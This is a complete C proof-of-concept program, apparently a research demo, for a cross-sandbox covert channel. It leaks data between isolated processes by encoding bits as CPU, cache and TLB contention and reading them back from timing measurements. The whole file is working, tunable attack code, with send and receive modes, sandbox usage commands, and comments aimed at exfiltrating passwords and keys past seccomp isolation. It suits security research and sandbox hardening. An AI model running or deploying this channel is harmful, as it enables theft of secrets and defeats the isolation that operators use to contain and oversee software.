/*
 * poc_covert_channel.c — Cross-sandbox covert channel via timing
 *
 * Demonstrates data exfiltration between two isolated sandbox processes
 * using only timing measurements — no shared memory, no files, no
 * network, no IPC. This works even in the strictest seccomp sandboxes
 * because clock_gettime() and memory allocation are always allowed.
 *
 * Based on: KernelSnitch (NDSS 2025), SLUBStick (USENIX 2024),
 * Cache side-channels (general literature).
 *
 * Channel mechanism:
 *   Sender encodes bits by creating CPU/memory contention:
 *     bit 1: allocate + touch many pages (causes cache/TLB pressure)
 *     bit 0: sleep (no contention)
 *   Receiver measures timing of its own memory operations:
 *     fast = no contention = bit 0
 *     slow = contention    = bit 1
 *
 * This is a simplified proof-of-concept. Production covert channels
 * use more sophisticated encoding (Manchester, error correction) and
 * can achieve 580+ kbit/s (KernelSnitch) or 100+ kbit/s (cache).
 *
 * Usage:
 *   Terminal 1 (receiver): ./poc_covert_channel recv
 *   Terminal 2 (sender):   ./poc_covert_channel send "SECRET"
 *
 * Compile: gcc -O2 -o poc_covert_channel poc_covert_channel.c -lpthread
 *
 * Both processes can be in separate sandboxes — the channel works
 * through shared CPU/cache/TLB hardware, which sandboxes cannot isolate.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/mman.h>
#include <sched.h>
#include <stdint.h>

/* ─── Configuration ─────────────────────────────────────────────────── */

/* Timing for one bit (microseconds).
 * Larger = more reliable, smaller = faster bandwidth.
 * 50ms per bit = ~20 bits/sec = ~2.5 bytes/sec.
 * Enough for passwords, keys, small secrets. */
#define BIT_PERIOD_US   50000

/* Number of pages to touch for a "1" bit (creates contention).
 * Reduced from 2048 (8MB) to 512 (2MB) for sandbox compatibility —
 * strict sandboxes may limit mmap size / rlimits. */
#define CONTENTION_PAGES 512

/* Threshold: if timing exceeds baseline * THRESHOLD_MULT, it's a "1" */
#define THRESHOLD_MULT  1.3

/* Sync: sender and receiver agree on start time (seconds since epoch,
 * rounded to next 10-second boundary). Both must start within 10s. */
#define SYNC_ROUND_SEC  10

/* ─── Helpers ───────────────────────────────────────────────────────── */

static uint64_t now_us(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000ULL + ts.tv_nsec / 1000;
}

static void busy_wait_us(uint64_t us) {
    uint64_t start = now_us();
    while (now_us() - start < us) {
        /* spin */
    }
}

static void sleep_us(uint64_t us) {
    struct timespec ts = { .tv_sec = us / 1000000, .tv_nsec = (us % 1000000) * 1000 };
    nanosleep(&ts, NULL);
}

/* Measure baseline: how fast are memory operations with no contention? */
static double measure_baseline(void *probe, size_t probe_size) {
    double total = 0;
    for (int i = 0; i < 20; i++) {
        uint64_t start = now_us();
        for (size_t j = 0; j < probe_size; j += 4096)
            ((volatile char *)probe)[j] = (char)i;
        uint64_t end = now_us();
        total += (end - start);
        sleep_us(1000); /* small gap between measurements */
    }
    return total / 20.0;
}

/* ─── Sender ────────────────────────────────────────────────────────── */

static void send_message(const char *message) {
    size_t len = strlen(message);

    /* Allocate contention buffer — touching these pages creates
     * cache/TLB pressure visible to the receiver */
    size_t contention_size = CONTENTION_PAGES * 4096;
    void *contention = mmap(NULL, contention_size, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (contention == MAP_FAILED) {
        perror("mmap contention buffer");
        return;
    }

    printf("[SEND] Message: \"%s\" (%zu bytes, %zu bits)\n", message, len, len * 8);
    printf("[SEND] Bit period: %d us (%d ms)\n", BIT_PERIOD_US, BIT_PERIOD_US / 1000);
    printf("[SEND] Estimated time: %.1f seconds\n", (len * 8 * BIT_PERIOD_US) / 1000000.0);
    printf("[SEND] Waiting for sync...\n");

    /* Sync: wait until next SYNC_ROUND_SEC boundary */
    struct timespec wall;
    clock_gettime(CLOCK_REALTIME, &wall);
    int wait_sec = SYNC_ROUND_SEC - (wall.tv_sec % SYNC_ROUND_SEC);
    printf("[SEND] Starting in %d seconds (at epoch %% %d == 0)\n",
           wait_sec, SYNC_ROUND_SEC);
    sleep(wait_sec);

    /* Send 8-bit length header */
    printf("[SEND] Transmitting length header: %zu\n", len);
    for (int bit = 7; bit >= 0; bit--) {
        int b = (len >> bit) & 1;
        uint64_t start = now_us();
        if (b) {
            /* BIT 1: create contention by touching many pages */
            while (now_us() - start < BIT_PERIOD_US) {
                for (size_t j = 0; j < contention_size; j += 4096)
                    ((volatile char *)contention)[j] = 1;
            }
        } else {
            /* BIT 0: be quiet */
            sleep_us(BIT_PERIOD_US);
        }
    }

    /* Send message bytes */
    printf("[SEND] Transmitting message...\n");
    for (size_t i = 0; i < len; i++) {
        unsigned char ch = message[i];
        for (int bit = 7; bit >= 0; bit--) {
            int b = (ch >> bit) & 1;
            uint64_t start = now_us();
            if (b) {
                while (now_us() - start < BIT_PERIOD_US) {
                    for (size_t j = 0; j < contention_size; j += 4096)
                        ((volatile char *)contention)[j] = 1;
                }
            } else {
                sleep_us(BIT_PERIOD_US);
            }
        }
        printf("[SEND] Sent byte %zu/%zu: '%c' (0x%02x)\n", i + 1, len, ch, ch);
    }

    printf("[SEND] Transmission complete.\n");
    munmap(contention, contention_size);
}

/* ─── Receiver ──────────────────────────────────────────────────────── */

static void receive_message(void) {
    /* Allocate probe buffer — we measure how fast we can touch these pages.
     * Contention from the sender slows us down. */
    size_t probe_size = 64 * 4096; /* 64 pages */
    void *probe = mmap(NULL, probe_size, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (probe == MAP_FAILED) {
        perror("mmap probe buffer");
        return;
    }

    printf("[RECV] Measuring baseline timing...\n");
    double baseline = measure_baseline(probe, probe_size);
    double threshold = baseline * THRESHOLD_MULT;
    printf("[RECV] Baseline: %.1f us, threshold: %.1f us\n", baseline, threshold);
    printf("[RECV] Waiting for sync...\n");

    /* Sync: wait until next SYNC_ROUND_SEC boundary */
    struct timespec wall;
    clock_gettime(CLOCK_REALTIME, &wall);
    int wait_sec = SYNC_ROUND_SEC - (wall.tv_sec % SYNC_ROUND_SEC);
    printf("[RECV] Starting in %d seconds (at epoch %% %d == 0)\n",
           wait_sec, SYNC_ROUND_SEC);
    sleep(wait_sec);

    /* Receive 8-bit length header */
    printf("[RECV] Receiving length header...\n");
    uint8_t msg_len = 0;
    for (int bit = 7; bit >= 0; bit--) {
        /* Sample timing during this bit period */
        uint64_t period_start = now_us();
        double max_timing = 0;
        int samples = 0;

        while (now_us() - period_start < BIT_PERIOD_US) {
            uint64_t t0 = now_us();
            for (size_t j = 0; j < probe_size; j += 4096)
                ((volatile char *)probe)[j] = 0;
            uint64_t t1 = now_us();
            double sample = t1 - t0;
            if (sample > max_timing) max_timing = sample;
            samples++;
        }

        int b = (max_timing > threshold) ? 1 : 0;
        msg_len |= (b << bit);
    }

    printf("[RECV] Message length: %d bytes\n", msg_len);

    if (msg_len == 0 || msg_len > 200) {
        printf("[RECV] Invalid length — sync failed or no sender.\n");
        printf("[RECV] Make sure sender starts within %d seconds of receiver.\n",
               SYNC_ROUND_SEC);
        munmap(probe, probe_size);
        return;
    }

    /* Receive message bytes */
    char *message = calloc(msg_len + 1, 1);
    printf("[RECV] Receiving %d bytes...\n", msg_len);

    for (int i = 0; i < msg_len; i++) {
        uint8_t ch = 0;
        for (int bit = 7; bit >= 0; bit--) {
            uint64_t period_start = now_us();
            double max_timing = 0;

            while (now_us() - period_start < BIT_PERIOD_US) {
                uint64_t t0 = now_us();
                for (size_t j = 0; j < probe_size; j += 4096)
                    ((volatile char *)probe)[j] = 0;
                uint64_t t1 = now_us();
                double sample = t1 - t0;
                if (sample > max_timing) max_timing = sample;
            }

            int b = (max_timing > threshold) ? 1 : 0;
            ch |= (b << bit);
        }
        message[i] = ch;
        printf("[RECV] Byte %d/%d: '%c' (0x%02x)\n", i + 1, msg_len, ch, ch);
    }

    printf("\n╔══════════════════════════════════════════════════════════╗\n");
    printf("║  RECEIVED MESSAGE                                      ║\n");
    printf("╠══════════════════════════════════════════════════════════╣\n");
    printf("║  \"%s\"\n", message);
    printf("╠══════════════════════════════════════════════════════════╣\n");
    printf("║  Channel: CPU/cache/TLB contention timing              ║\n");
    printf("║  No shared memory, files, network, or IPC used.        ║\n");
    printf("║  Works across separate sandbox instances.              ║\n");
    printf("║  Bandwidth: ~%.0f bits/sec (~%.1f bytes/sec)               ║\n",
           1000000.0 / BIT_PERIOD_US, 1000000.0 / BIT_PERIOD_US / 8);
    printf("╚══════════════════════════════════════════════════════════╝\n");

    free(message);
    munmap(probe, probe_size);
}

/* ─── Self-test (single-process demo) ───────────────────────────────── */

static void self_test(void) {
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  Covert Channel Self-Test (single process demo)        ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");

    size_t probe_size = 64 * 4096;
    void *probe = mmap(NULL, probe_size, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (probe == MAP_FAILED) {
        perror("[-] mmap probe buffer failed");
        return;
    }

    size_t contention_size = CONTENTION_PAGES * 4096;
    void *contention = mmap(NULL, contention_size, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (contention == MAP_FAILED) {
        /* Fallback: try smaller allocation */
        contention_size = 128 * 4096; /* 512KB */
        contention = mmap(NULL, contention_size, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (contention == MAP_FAILED) {
            perror("[-] mmap contention buffer failed");
            munmap(probe, probe_size);
            return;
        }
        printf("[*] Note: using smaller contention buffer (%zu KB)\n",
               contention_size / 1024);
    }

    /* Measure baseline (no contention) */
    printf("[*] Measuring baseline (no contention)...\n");
    double baseline = measure_baseline(probe, probe_size);
    printf("    Baseline: %.1f us per probe sweep\n\n", baseline);

    /* Measure with contention */
    printf("[*] Measuring with contention (simulating '1' bit)...\n");
    double contention_total = 0;
    for (int i = 0; i < 20; i++) {
        /* Create contention */
        for (size_t j = 0; j < contention_size; j += 4096)
            ((volatile char *)contention)[j] = 1;

        /* Measure probe timing */
        uint64_t start = now_us();
        for (size_t j = 0; j < probe_size; j += 4096)
            ((volatile char *)probe)[j] = 0;
        uint64_t end = now_us();
        contention_total += (end - start);
    }
    double contention_avg = contention_total / 20.0;
    printf("    With contention: %.1f us per probe sweep\n\n", contention_avg);

    double ratio = contention_avg / baseline;
    printf("─── Results ───────────────────────────────────────────────\n");
    printf("  Baseline (0 bit): %.1f us\n", baseline);
    printf("  Contention (1):   %.1f us\n", contention_avg);
    printf("  Ratio:            %.2fx\n", ratio);
    printf("  Threshold:        %.2fx\n", THRESHOLD_MULT);
    printf("\n");

    if (ratio >= THRESHOLD_MULT) {
        printf("  \033[92mCHANNEL VIABLE\033[0m: %.2fx ratio > %.2fx threshold\n", ratio, THRESHOLD_MULT);
        printf("  Contention from one process is measurable by another.\n");
        printf("  Estimated bandwidth: ~%.0f bits/sec\n", 1000000.0 / BIT_PERIOD_US);
        printf("\n");
        printf("  To test across sandboxes:\n");
        printf("    Terminal 1: sandbox-run -- ./poc_covert_channel recv\n");
        printf("    Terminal 2: sandbox-run -- ./poc_covert_channel send \"SECRET\"\n");
    } else {
        printf("  \033[93mCHANNEL MARGINAL\033[0m: %.2fx ratio < %.2fx threshold\n", ratio, THRESHOLD_MULT);
        printf("  On this hardware, the timing difference is small.\n");
        printf("  Try increasing CONTENTION_PAGES or running on bare metal.\n");
    }

    munmap(probe, probe_size);
    munmap(contention, contention_size);
}

/* ─── Main ──────────────────────────────────────────────────────────── */

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage:\n");
        printf("  %s test                  — self-test (single process)\n", argv[0]);
        printf("  %s recv                  — receive mode (start first)\n", argv[0]);
        printf("  %s send \"message\"        — send mode (start second)\n", argv[0]);
        printf("\n");
        printf("Cross-sandbox covert channel via CPU/cache timing.\n");
        printf("No shared memory, files, network, or IPC needed.\n");
        return 1;
    }

    if (strcmp(argv[1], "test") == 0) {
        self_test();
    } else if (strcmp(argv[1], "recv") == 0) {
        receive_message();
    } else if (strcmp(argv[1], "send") == 0) {
        if (argc < 3) {
            printf("Usage: %s send \"message\"\n", argv[0]);
            return 1;
        }
        send_message(argv[2]);
    } else {
        printf("Unknown command: %s (use test, recv, or send)\n", argv[1]);
        return 1;
    }

    return 0;
}
